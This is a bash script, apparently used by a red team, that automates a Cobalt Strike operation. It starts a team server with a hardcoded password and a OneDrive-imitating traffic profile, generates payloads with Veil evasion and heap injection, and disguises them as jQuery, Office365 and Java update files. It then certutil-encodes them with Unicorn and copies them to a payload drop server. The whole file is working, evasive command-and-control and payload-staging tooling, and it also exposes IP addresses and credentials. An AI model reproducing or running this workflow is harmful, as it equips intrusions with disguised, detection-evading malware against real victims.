#!/bin/bash
### Script to start TeamServer, generate payload, push payload to webhost, and start cobaltstrike
### Author: EKelly
### 23 Mar 2020

#colors
Green='\033[0;32m' 
Cyan='\033[0;36m'  
Red='\033[0;31m' 
NC='\033[0m'		

# def functions

get_date(){
	while  true ; do
	
		#check if the date is somehow alrady set. 
		if date --date "$varEndDate" 2>/dev/null > /dev/null ; then
			break
		fi
	
    	#check if there was any input, if not it asks for the date from 
        #the user 
		if [ -z "$input" ]; then 
			read -ep  "Input End Date of Assessment for beacon kill: " input
		fi
	
		target_epoch=$( date --date "$input" +%s )
	
    	#check if the target_epoch is not set. and restart if nessissary
		#also clear the input variable for the next loop, if it comes to that.
			if [ -z "$target_epoch" ] ; then
			unset input
			continue
		else
			unset input
		fi
	
		#test if time is in the past
		if (( $target_epoch <= $(date +%s) )); then
			echo "Error: The date is in the past, Try again."
			continue
		fi
	
		#add 1 day worth of seconds to the epoc time
		target_epoch=$(( $target_epoch + 86400 ))
	
		#test if time is more than 2 months worth of seconds in the future
		if (( $target_epoch >= ( $( date +%s ) + 5200000 ) )); then
			read -ep  "Warning: The date is more than 2 months in the future, type yes to accept or press anything to try again: "
			case $REPLY in
				[Yy][Ee][Ss]|[yY]) true
					;;
				*) continue
					;;
			esac
		fi
	
		#actually setting the varEndDate variable as the desired format needed to run the the teamserver
		varEndDate=$(date --date @$target_epoch +%F)
	
		done

	}

rebuild_artifact(){
	/root/CNDTools/scripts/RebuildArtifacts.sh 2>/dev/null
}

git_folder (){
	if [[ $HOSTNAME == "cnd-tool-01" ]]; then
		export varKALI=Kali01
		export varOfficeUpdate=Office365-Update01
		export varJava=01
		export varJqueryNumber=1.1.2
        export varTeamServerIP=12.183.171.36
		wget https://github.cnd.ca.gov/CND/CNDTools/raw/master/scripts/dmz/$varKALI/payload_generate.cna -O /root/cobaltstrike/scripts/payload_generate.cna
	elif [[ $HOSTNAME == "cnd-tool-02" ]]; then
		export varKALI=Kali02
		export varOfficeUpdate=Office365-Update02
		export varJava=02
		export varJqueryNumber=1.2.2
        export varTeamServerIP=12.183.171.37
		wget https://github.cnd.ca.gov/CND/CNDTools/raw/master/scripts/dmz/$varKALI/payload_generate.cna -O /root/cobaltstrike/scripts/payload_generate.cna
	elif [[ $HOSTNAME == "cnd-tool-03" ]]; then
		export varKALI=Kali03
		export varOfficeUpdate=Office365-Update03
		export varJava=03
		export varJqueryNumber=2.3.2
        export varTeamServerIP=12.183.171.38
		wget https://github.cnd.ca.gov/CND/CNDTools/raw/master/scripts/dmz/$varKALI/payload_generate.cna -O /root/cobaltstrike/scripts/payload_generate.cna
	elif [[ $HOSTNAME == "cnd-tool-04" ]]; then
		export varKALI=Kali04
		export varOfficeUpdate=Office365-Update04
		export varJava=04
		export varJqueryNumber=2.4.2
        export varTeamServerIP=12.183.171.39
		wget https://github.cnd.ca.gov/CND/CNDTools/raw/master/scripts/dmz/$varKALI/payload_generate.cna -O /root/cobaltstrike/scripts/payload_generate.cna
	elif [[ $HOSTNAME == "cnd-tool-05" ]]; then
		export varKALI=Kali05
		export varOfficeUpdate=Office365-Update05
		export varJava=05
		export varJqueryNumber=3.5.2
        export varTeamServerIP=12.44.206.21
		wget https://github.cnd.ca.gov/CND/CNDTools/raw/master/scripts/dmz/$varKALI/payload_generate.cna -O /root/cobaltstrike/scripts/payload_generate.cna
	elif [[ $HOSTNAME == "cnd-tool-06" ]]; then
		export varKALI=Kali06
		export varOfficeUpdate=Office365-Update06
		export varJava=06
		export varJqueryNumber=3.6.2
        export varTeamServerIP=12.44.206.22
		wget https://github.cnd.ca.gov/CND/CNDTools/raw/master/scripts/dmz/$varKALI/payload_generate.cna -O /root/cobaltstrike/scripts/payload_generate.cna
	else
		echo -e "This appears to not be a KALI box"
	fi 
} &>/dev/null

notice_teamserver(){
	echo -e ${Cyan}"TeamServer is starterd in a new terminal window"${NC}
}

start_teamserver (){
	screen -dmS teamserver bash -c "cd /root/cobaltstrike; ./teamserver $varTeamServerIP 1qaz2wsx httpsProfile/onedrive_getonly.profile $varEndDate"
	gnome-terminal --tab -t teamserver --command="screen -r teamserver"
	sleep 3
	}

notice_agrressors(){
	echo -e ${Cyan}"Agressors are loaded in a new terminal window"${NC}
}

load_aggressors(){
	screen -dmS agscript bash -c "cd /root/cobaltstrike; ./agscript 127.0.0.1 50050 payloadgen_user1 1qaz2wsx /root/cobaltstrike/scripts/load-cna.cna"
	gnome-terminal --tab -t agscript --command="screen -r agscript"
}

veil_evasion(){
	sleep 5s
	cd /root/Veil
	varCustomShellcode=$(cat /root/cobaltstrike/payloads/veil-payload$varJava.txt)

	echo "use 1
		use 13
		set COMPILE_TO_EXE N
		set INJECT_METHOD Heap
		options
		generate
		3
		$varCustomShellcode
		/n
		load-jquery-$varJqueryNumber
		/n
		exit" | ./Veil.py
	mv /var/lib/veil/output/source/load-jquery-$varJqueryNumber.cs /root/cobaltstrike/payloads/load-jquery-$varJqueryNumber.js
	./veil --clean
}

start_cobalstrike (){
	cd /root/cobaltstrike/
	./cobaltstrike 
}

notice_dont_close(){
	echo -e ${Cyan}"Do Not Cose The Terminal Window or Tabs."${NC}
}

unicorn_encode (){
# use Unicorn to certutil encode files
	cd /root/unicorn
	python unicorn.py /root/cobaltstrike/payloads/$varOfficeUpdate.exe crt 
	rm decode_attack/decode_command.bat
	mv decode_attack/encoded_attack.crt /root/cobaltstrike/payloads/java-update-8_181-$varJava.txt
}

push_payloads(){
	sleep 20s
	scp /root/cobaltstrike/payloads/java-update-8_181-$varJava.txt cndadmin@172.16.3.21:/home/cndadmin/payload_drop
	scp /root/cobaltstrike/payloads/$varOfficeUpdate.exe cndadmin@172.16.3.21:/home/cndadmin/payload_drop
	scp /root/cobaltstrike/payloads/load-jquery-$varJqueryNumber.js cndadmin@172.16.3.21:/home/cndadmin/payload_drop
}


varEndDate=false
input="$@"
get_date
#echo -e "Input End Date of Assessment for beacon kill (YYYY-MM-DD)"
#read -e varEndDate

rebuild_artifact
git_folder &>/dev/null
notice_teamserver
start_teamserver &>/dev/null
notice_agrressors 
load_aggressors &>/dev/null
veil_evasion &>/dev/null
unicorn_encode &>/dev/null
push_payloads &>/dev/null
notice_dont_close
start_cobalstrike 


